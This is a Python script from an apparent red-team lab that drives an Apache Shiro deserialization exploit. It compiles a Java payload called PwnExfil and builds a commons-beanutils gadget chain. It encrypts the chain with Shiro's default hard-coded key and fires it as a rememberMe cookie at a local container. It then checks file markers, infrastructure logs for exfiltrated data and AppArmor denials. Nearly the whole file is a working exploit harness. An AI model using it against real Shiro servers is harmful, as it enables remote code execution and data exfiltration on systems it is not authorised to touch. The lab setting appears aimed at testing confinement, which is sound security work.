# -*- coding: utf-8 -*-
"""RT5-C Shiro: compile PwnExfil, build CB1, fire, verify exfil at infra."""
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
LAB = os.path.abspath(os.path.join(HERE, "..", ".."))
sys.path.insert(0, os.path.join(LAB, "exp"))
sys.path.insert(0, os.path.join(LAB, "exp", "shiro"))
from common import session  # noqa: E402
from shiro_exp import encrypt_rememberme  # noqa: E402

KEY = "kPH+bIxk5D2deZiIxcaaaA=="
OUT = os.path.join(HERE, "out")
os.makedirs(OUT, exist_ok=True)

r = subprocess.run([
    "docker", "run", "--rm", "-v", LAB.replace(os.sep, "/") + ":/w", "-w", "/w",
    "eclipse-temurin:8-jdk-alpine", "sh", "-c",
    "javac -source 7 -target 7 -d /w/exp/rt5/out /w/exp/rt5/java/PwnExfil.java 2>&1"
], capture_output=True, text=True)
print(r.stdout[-800:] + r.stderr[-800:])

r = subprocess.run([
    "docker", "run", "--rm", "-v", LAB.replace(os.sep, "/") + ":/w", "-w", "/w/exp/shiro/rt",
    "eclipse-temurin:8-jdk-alpine", "sh", "-c",
    "java -cp /w/exp/shiro/rt:/w/exp/shiro/commons-beanutils-1.9.4.jar:"
    "/w/exp/shiro/commons-collections-3.2.2.jar:/w/exp/rt5/out "
    "GenPwnRT /w/exp/rt5/out/rt5_shiro_exfil.ser /w/exp/rt5/out/PwnExfil.class 2>&1"
], capture_output=True, text=True)
print(r.stdout[-800:] + r.stderr[-800:])
ser = os.path.join(OUT, "rt5_shiro_exfil.ser")
if not os.path.exists(ser) or os.path.getsize(ser) == 0:
    sys.exit("CB1 build failed")

val = encrypt_rememberme(open(ser, "rb").read(), KEY).decode()
s = session()
r = s.get("http://127.0.0.1:18083/", headers={"Cookie": "rememberMe=" + val},
          timeout=60, allow_redirects=False)
print("[*] PwnExfil CB1 -> HTTP %s (%dB)" % (r.status_code, len(r.content)))

print("\n=== truth: allowed-path marker + /tmp ===")
r = subprocess.run(["docker", "exec", "multi-round-lab-shiro-1", "ls", "-l", "--full-time",
                    "/run/aa-tmp/shiro/rt5_allowed_marker", "/tmp/rt5_shiro_tmp"],
                   capture_output=True, text=True)
print((r.stdout + r.stderr).strip())

print("=== infra log (rt5 exfil) ===")
r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "3m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "/rt5/shiro" in line:
        print("[infra] " + line[:200])

print("=== audit (aa-shiro new denials) ===")
r = subprocess.run(["wsl", "-u", "root", "--", "bash", "-c",
                    "dmesg | grep 'apparmor=\"DENIED\"' | grep 'aa-shiro' | tail -3"],
                   capture_output=True, text=True)
print(r.stdout + r.stderr)
